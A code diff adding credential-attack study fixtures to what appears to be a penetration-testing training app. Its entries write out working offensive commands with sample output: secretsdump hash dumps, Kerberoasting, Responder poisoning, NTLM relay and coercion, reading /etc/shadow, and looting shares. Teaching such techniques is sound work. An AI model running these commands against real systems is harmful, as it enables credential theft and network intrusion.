@@ -2271,4 +2271,73 @@
   };
   Object.keys(RECON_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = RECON_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });
 
+  // creds lane lead-ups. Crack moves are reached from the dump or capture that produced the hash;
+  // online brute moves from a scan with no credential; poisoning/relay from a LAN foothold.
+  // Multi-route only where a genuine second source exists (SAM vs NTDS, Responder vs relay, signing vs coercion).
+  var CREDS_LEADUPS = {
+    "crack-identify": [
+      { key: "dump", label: "A dump produced an unknown hash", steps: [
+        { title: "Dump local secrets", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump corp.local/jsmith:'P@ss'@<target>", out: "[*] Dumping local SAM hashes\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", sig: "31d6cfe0d16ae931b73c59d7e0c089c0", teach: "You are holding a hash but do not yet know its type; naming it decides the crack mode." } ] },
+    ],
+    "crack-kerberoast": [
+      { key: "roast", label: "Kerberoasting returned a service ticket", steps: [
+        { title: "Request SPN tickets", tool: "GetUserSPNs", where: "local", cmd: "impacket-GetUserSPNs corp.local/jsmith:'P@ss' -request", out: "$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQL/sql01*$a1b2...", sig: "$krb5tgs$23$", teach: "The $krb5tgs$ hash cracks offline to the service account's password, with no lockout risk." } ] },
+    ],
+    "crack-asrep-offline": [
+      { key: "roast", label: "AS-REP roasting returned a hash", steps: [
+        { title: "Roast pre-auth-disabled users", tool: "GetNPUsers", where: "local", cmd: "impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass", out: "$krb5asrep$23$tgibson@CORP.LOCAL:f3c8...", sig: "$krb5asrep$23$", teach: "The $krb5asrep$ hash cracks offline to tgibson's plaintext, no credential spent to get it." } ] },
+    ],
+    "crack-ntlm": [
+      { key: "sam", label: "A local SAM dump", steps: [
+        { title: "Dump the local SAM", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump -sam sam.save -system system.save LOCAL", out: "Administrator:500:aad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::", sig: "2b576acbe6bcfda7294d6bd18041b8fe", teach: "The local Administrator NT hash may crack, or pass, or reveal a password reused on other hosts." } ] },
+      { key: "ntds", label: "A domain NTDS dump", steps: [
+        { title: "Dump NTDS.dit", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump -just-dc corp.local/Administrator@<target>", out: "corp.local\\jsmith:1103:aad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::", sig: "64f12cddaa88057e06a81b54e73b949b", teach: "Every domain user's NT hash is in hand; crack the weak ones for plaintext you can reuse." } ] },
+    ],
+    "crack-netntlmv2": [
+      { key: "responder", label: "Responder caught a hash", steps: [
+        { title: "Poison and capture", tool: "responder", where: "local", cmd: "sudo responder -I eth0", out: "[SMB] NTLMv2-SSP Hash : jsmith::CORP:1122334455667788:A1B2...", sig: "NTLMv2-SSP Hash", teach: "A NetNTLMv2 capture cannot be passed, so cracking (or relaying) is the only way to use it." } ] },
+      { key: "relay", label: "A relay logged a hash it could not use", steps: [
+        { title: "Relay saw signing required", tool: "ntlmrelayx", where: "local", cmd: "sudo impacket-ntlmrelayx -tf targets.txt -smb2support", out: "[-] Signing is required, relay to SMB not possible\n[*] Captured NetNTLMv2: svc_backup", sig: "Captured NetNTLMv2", teach: "Signing blocked the relay, but the hash was logged; cracking it is the fallback." } ] },
+    ],
+    "crack-shadow": [
+      { key: "foothold", label: "You read /etc/shadow as root", steps: [
+        { title: "Read the shadow file", tool: "cat", where: "host", cmd: "cat /etc/shadow", out: "root:$6$Xq2$9Zk...:19876:0:99999:7:::", sig: "root:$6$", teach: "$6$ marks a SHA-512 crypt hash; crack it offline (hashcat -m 1800) rather than on the box." } ] },
+    ],
+    "crack-archive": [
+      { key: "loot", label: "A share held a locked archive", steps: [
+        { title: "Pull the archive from a share", tool: "smbclient", where: "local", cmd: "smbclient //<target>/backups -N -c 'get backup.zip'", out: "getting file backup.zip (5242880 bytes)", sig: "backup.zip", teach: "A password-protected archive in loot almost always hides the next credential." } ] },
+    ],
+    "crack-mscache2": [
+      { key: "dump", label: "A workstation dump leaked cached logons", steps: [
+        { title: "Dump a workstation's secrets", tool: "secretsdump", where: "local", cmd: "impacket-secretsdump -security security.save -system system.save LOCAL", out: "[*] Dumping cached domain logon information\nCORP.LOCAL/jsmith:$DCC2$10240#jsmith#a1b2c3...", sig: "$DCC2$", teach: "DCC2 blobs are cached domain logons; slow to crack but a genuine domain password when one falls." } ] },
+    ],
+    "online-brute-ssh": [
+      { key: "scan", label: "The scan found 22 and you have a user list", steps: [
+        { title: "Confirm SSH is open", tool: "nmap", where: "local", cmd: "nmap -p 22 <target>", out: "22/tcp open  ssh", sig: "22/tcp open  ssh", teach: "With SSH open and a username in hand, a tight, slow brute is a last-resort way in." } ] },
+    ],
+    "online-brute-ftp": [
+      { key: "scan", label: "Anonymous FTP failed", steps: [
+        { title: "Anonymous login was refused", tool: "curl", where: "local", cmd: "curl ftp://anonymous:anonymous@<target>/", out: "curl: (67) Access denied: 530", sig: "530", teach: "Anonymous is closed, so a careful credentialed brute is the fallback for this FTP." } ] },
+    ],
+    "online-brute-rdp": [
+      { key: "scan", label: "The scan found 3389 and no credential works yet", steps: [
+        { title: "Confirm RDP is open", tool: "nmap", where: "local", cmd: "nmap -p 3389 <target>", out: "3389/tcp open  ms-wbt-server", sig: "3389/tcp open  ms-wbt-server", teach: "RDP is open but you hold no credential; a slow, lockout-aware spray is the late-stage option." } ] },
+    ],
+    "responder-poison": [
+      { key: "internal", label: "You are on the internal network with no credential", steps: [
+        { title: "Confirm your network position", tool: "ip", where: "host", cmd: "ip -4 addr show eth0", out: "inet 10.10.10.50/24 brd 10.10.10.255 scope global eth0", sig: "10.10.10.50/24", teach: "On the LAN with no credential, poisoning broken name resolution harvests hashes passively." } ] },
+    ],
+    "ntlm-relay-attack": [
+      { key: "signing", label: "A host has SMB signing disabled", steps: [
+        { title: "Find a relay target", tool: "netexec", where: "local", cmd: "nxc smb 10.10.10.0/24 --gen-relay-list targets.txt", out: "SMB  10.10.10.8  445  FILE01  [+] signing:False", sig: "signing:False", teach: "A host that does not require SMB signing is a valid relay target; now capture auth to send to it." } ] },
+      { key: "coerce", label: "You can coerce authentication", steps: [
+        { title: "A coercion primitive is available", tool: "coercer", where: "local", cmd: "coercer coerce -t <target> -l <lhost> -u jsmith -p 'P@ss'", out: "[+] FILE01 authenticated to <lhost> (SMB)", sig: "authenticated to <lhost>", teach: "If you can force a host to authenticate to you, relay that authentication instead of waiting for it." } ] },
+    ],
+    "mitm6-ipv6-takeover": [
+      { key: "quiet", label: "Responder stayed quiet on IPv4", steps: [
+        { title: "IPv4 name resolution is silent", tool: "responder", where: "local", cmd: "sudo responder -I eth0 -A", out: "[Analyze mode: ON, no poisoning]\n(no LLMNR/NBT-NS queries seen)", sig: "Analyze mode: ON", teach: "When IPv4 name resolution is quiet, the IPv6 stack nobody configured is the opening mitm6 abuses." } ] },
+    ]
+  };
+  Object.keys(CREDS_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = CREDS_LEADUPS[k]; });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
